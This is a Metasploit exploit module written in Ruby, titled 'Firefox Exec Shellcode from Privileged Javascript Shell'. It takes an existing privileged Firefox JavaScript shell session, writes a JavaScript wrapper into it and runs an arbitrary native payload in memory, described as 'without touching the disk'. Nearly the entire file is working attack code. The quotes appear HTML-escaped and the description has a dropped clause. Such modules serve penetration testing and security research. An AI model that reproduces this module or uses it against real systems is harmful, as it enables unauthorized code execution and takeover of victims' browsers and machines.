# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/payload/firefox&#039;

class Metasploit3 < Msf::Exploit::Local

  include Msf::Payload::Firefox
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Firefox Exec Shellcode from Privileged Javascript Shell&#039;,
      &#039;Description&#039;   => %q{
        Allows execution of native payloads from a privileged Firefox Javascript shell.
        Puts the specified payload into memory, adds the necessary protection flags,
        session without touching the disk.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [ &#039;joev&#039; ],
      &#039;Platform&#039;      => [ &#039;firefox&#039; ],
      &#039;DisclosureDate&#039; => &#039;Mar 10 2014&#039;,
      &#039;Targets&#039;       => [
        [
          &#039;Native Payload&#039;, {
            &#039;Platform&#039; => %w{ linux osx win unix },
            &#039;Arch&#039;     => ARCH_ALL
          }
        ]
      ],
      &#039;DefaultTarget&#039; => 0
    ))

    register_options([
      OptInt.new(&#039;TIMEOUT&#039;, [true, "Maximum time (seconds) to wait for a response", 90])
    ], self.class)
  end

  def exploit
    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore[&#039;TIMEOUT&#039;])
  end

  def js_payload
    %Q|
      (function(send){
        try {
          #{run_payload}
          send("Payload executed.");
        } catch (e) {
          send(e);
        }
      })(send);
    |.strip
  end
end

